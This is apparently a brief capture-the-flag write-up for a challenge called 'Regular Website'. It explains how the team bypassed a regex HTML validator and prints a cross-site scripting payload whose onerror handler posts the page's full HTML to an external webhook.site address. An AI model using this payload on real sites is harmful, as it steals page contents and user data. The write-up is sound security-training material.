# Regular Website


After a quick look at the source code, we can see that the regex is a html validator. One of my teammates found the following bypass: `<img src=https://webhookurl.com <`. Then I tried with `onerror="post request to the webhook"` and it worked as long as there were no newlines in the text. From that one of my teammates made the following payload to send the page contents to a webhook: `<img src=a onerror="const xhr = new XMLHttpRequest(); xhr.open('POST', 'https://webhook.site/127923f4-5e6e-4b1a-b11f-723c83e5aae9/%27+encodeURIComponent(document.documentElement.innerHTML.replace(/(/s)/gm, ''))); xhr.send();"<` and we got the flag.

